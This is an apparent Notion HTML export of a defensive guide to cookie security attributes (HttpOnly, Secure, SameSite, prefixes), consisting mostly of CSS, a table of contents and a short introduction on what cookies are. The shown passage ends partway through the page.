<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>HttpOnly and Secure cookies</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

/* Override strong tags inside headings to maintain consistent weight */
h1 strong,
h2 strong,
h3 strong {
	font-weight: 600;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 10px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.collection-content td {
	white-space: pre-wrap;
	word-break: break-word;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-flex;
	align-items: center;
	justify-content: center;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.callout img.notion-static-icon {
	width: 1em;
	height: 1em;
}

.callout p {
	margin: 0;
}

.callout h1,
.callout h2,
.callout h3 {
	margin: 0 0 0.6rem;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

blockquote.quote-large {
	font-size: 1.25em;
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray {
	color: rgba(125, 122, 117, 1);
	fill: rgba(125, 122, 117, 1);
}
.highlight-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.highlight-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.highlight-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.highlight-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.highlight-blue {
	color: rgba(56, 125, 201, 1);
	fill: rgba(56, 125, 201, 1);
}
.highlight-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.highlight-default_background {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray_background {
	background: rgba(42, 28, 0, 0.07);
}
.highlight-brown_background {
	background: rgba(139, 46, 0, 0.086);
}
.highlight-orange_background {
	background: rgba(224, 101, 1, 0.129);
}
.highlight-yellow_background {
	background: rgba(211, 168, 0, 0.137);
}
.highlight-teal_background {
	background: rgba(0, 100, 45, 0.09);
}
.highlight-blue_background {
	background: rgba(0, 124, 215, 0.094);
}
.highlight-purple_background {
	background: rgba(102, 0, 178, 0.078);
}
.highlight-pink_background {
	background: rgba(197, 0, 93, 0.086);
}
.highlight-red_background {
	background: rgba(223, 22, 0, 0.094);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(125, 122, 117, 1);
	fill: rgba(125, 122, 117, 1);
}
.block-color-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.block-color-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.block-color-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.block-color-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.block-color-blue {
	color: rgba(56, 125, 201, 1);
	fill: rgba(56, 125, 201, 1);
}
.block-color-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(240, 239, 237, 1);
}
.block-color-brown_background {
	background: rgba(245, 237, 233, 1);
}
.block-color-orange_background {
	background: rgba(251, 235, 222, 1);
}
.block-color-yellow_background {
	background: rgba(249, 243, 220, 1);
}
.block-color-teal_background {
	background: rgba(232, 241, 236, 1);
}
.block-color-blue_background {
	background: rgba(229, 242, 252, 1);
}
.block-color-purple_background {
	background: rgba(243, 235, 249, 1);
}
.block-color-pink_background {
	background: rgba(250, 233, 241, 1);
}
.block-color-red_background {
	background: rgba(252, 233, 231, 1);
}
.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="2b2562ad-76f0-80d2-9c29-e802f3c8e1c9" class="page mono"><header><h1 class="page-title" dir="auto">HttpOnly and Secure cookies</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2b2562ad-76f0-80ea-9818-f2a3a4189b75" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-8009-be96-e87a7e06148b">Introduction</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80c9-b5f5-d57c9ff726f9">What are Cookies?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8051-a853-d8e94691179c">Why Cookie Security Matters</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-80db-9932-db002bba0be3">HttpOnly Attribute</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8076-9409-f55fbf39d81b">Definition</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8038-9202-e80155dcdb32">⚠️ CRITICAL: HttpOnly Does NOT Protect Against CSRF</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80ad-98a2-d5fb44508a6a">How It Works</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8086-890b-ce0f9e16394a">Syntax</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80d8-8a18-ca3d866ad0e5">Example: Without HttpOnly (Vulnerable to XSS)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-808c-a848-cbd4473d0548">Example: With HttpOnly (Protected from XSS)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-808e-bea4-d53031886862">Example: HttpOnly Does NOT Prevent CSRF</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8001-90f2-d94bc634ed23">When to Use HttpOnly</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-803f-a0ea-ead8b80f3fb0">Limitations</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-80ac-b3f3-c1fde6d10898">Secure Attribute</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-806d-895e-c384e36927dc">Definition</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-805f-ad1b-d572c5aec22c">How It Works</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80a4-a29b-cf7985d05a7d">Syntax</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-801b-b4fa-c25e417e3efe">Example: Without Secure (Vulnerable)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8000-b1e3-dac703937668">Example: With Secure (Protected)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8025-93ff-cfe7dc881cc0">When to Use Secure</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80ce-8689-d32b73480357">Important Notes</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-807e-a999-f62e55fdfaf6">Browser Behavior</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-80c6-a17c-c0fcaa95965a">SameSite Attribute</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8029-b151-fd8cb02ede51">Definition</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80fb-b1a6-dae7739e2beb">⚠️ This is What Actually Protects Against CSRF</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8043-94dd-cff1c6dc9b92">Values</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8070-9671-ce0834933125">1. SameSite=Strict</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80b5-b5cd-c6cb4373099a">2. SameSite=Lax (Default in Modern Browsers)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80eb-ae3f-fdf75c448604">3. SameSite=None</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-803d-811a-c78e4b1d7150">SameSite Default Behavior</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80f1-b303-cf6d82770114">SameSite and CSRF Protection</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-8001-8b97-c345172d3a3a">Cookie Prefixes</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8067-b44d-e263d1528688">__Secure- Prefix</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80a3-926d-cabfeaea6ffb">__Host- Prefix</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-80d9-bd49-ca2d26ec00f7">Other Cookie Attributes</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8063-bfd7-dfc6998ff50e">Domain Attribute</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8051-9ce3-c7bbb4cb3058">Path Attribute</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-807d-bdb6-fb997e836f37">Expires and Max-Age Attributes</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-80d5-93b0-d9158ae9a671">Complete Cookie Security Implementation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80b7-bd14-d8fe79af5882">Recommended Configuration for Session Cookies</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-805f-8467-c94c298adcf3">Recommended Configuration for Authentication Cookies</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80d4-b772-db936e1a6d36">Recommended Configuration for Third-Party Cookies</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8092-b210-f2f44568fa69">Implementation Examples</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-801a-96cb-f79bb346d207">Node.js (Express)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8083-9873-f5caa82962d9">Python (Flask)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80b1-9d6c-e470f4ef0bc7">PHP</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80c4-b6ff-dd71564b8b13">Java (Spring Boot)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8092-a681-cfb018316800">C# (ASP.NET Core)</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-806b-ad2d-eb88654e8e38">Browser Compatibility</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8086-a287-d7239139bd9c">HttpOnly Support</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8070-a68f-d3b98a1a3ef4">Secure Support</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8010-ae2c-f03e4110fedd">SameSite Support</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80b7-a0d1-fc12854e9671">Cookie Prefixes Support</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-804e-98a9-fdcaa6d650e4">Testing Cookie Attributes</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-802a-8e30-d9d578d7b63e">Common Vulnerabilities and Mitigations</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-804c-b47b-dce1b86a5fac">1. Missing HttpOnly (XSS Vulnerability)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-801e-aa84-f7351d04c120">2. Missing Secure (MitM Vulnerability)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80d3-a8d3-c6c272214e36">3. Missing SameSite (CSRF Vulnerability)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8083-9bf0-c96de93e1547">4. Overly Broad Domain (Subdomain Attack)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80c7-849d-f8a336e0c8ae">5. Long-Lived Cookies (Session Fixation)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80d8-8c72-fdfd8d4c988a">6. SameSite=None Without Secure</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80ec-ba04-cca3f67f5063">7. Cookie Theft via Document.cookie</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-8000-a01c-ee8d03a7ad2f">Real-World Scenarios</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80ca-a235-d0223a19f1d3">Scenario 1: E-Commerce Session Management</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-808b-8e2b-f685ba6c6877">Scenario 2: Banking Application</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-802d-a165-d83a0e60b454">Scenario 3: OAuth/SSO Integration</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-80ae-a0ae-f52d14961204">Scenario 4: Multi-Tenant SaaS Application</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8099-bdfe-f376a6256e48">Scenario 5: API Authentication</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8084-bb3a-c85a25702526">Scenario 6: Remember Me Functionality</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2b2562ad-76f0-8091-a62a-e48a949735ba">Summary</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8020-a59e-cedefde1aa4c">Essential Cookie Security Checklist</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8033-8067-c5005c017775">Quick Reference</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-806f-9f2a-d92ee1d4b7b4">Final Recommendations</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2b2562ad-76f0-8006-a207-cf01026fbfeb">Key Takeaways</a></div></nav></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-802a-bca2-e0e1367a2c9d"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-8009-be96-e87a7e06148b" class="">Introduction</h2></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8015-b5d4-c306dccf598b" class="">HTTP cookies are small pieces of data stored by the browser and sent with every request to the server. While essential for maintaining state in web applications, cookies can be a significant security risk if not properly configured. This guide covers all cookie security attributes, their purposes, implementations, and best practices.</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80c9-b5f5-d57c9ff726f9" class="">What are Cookies?</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8023-988a-d0c588174f44" class="">Cookies are name-value pairs sent by the server via the <code>Set-Cookie</code> header and automatically included by the browser in subsequent requests via the <code>Cookie</code> header. They are commonly used for:<br/>- Session management<br/>- User authentication<br/>- Personalization<br/>- Tracking and analytics</p></div><div style="display:contents" dir="auto"><h3 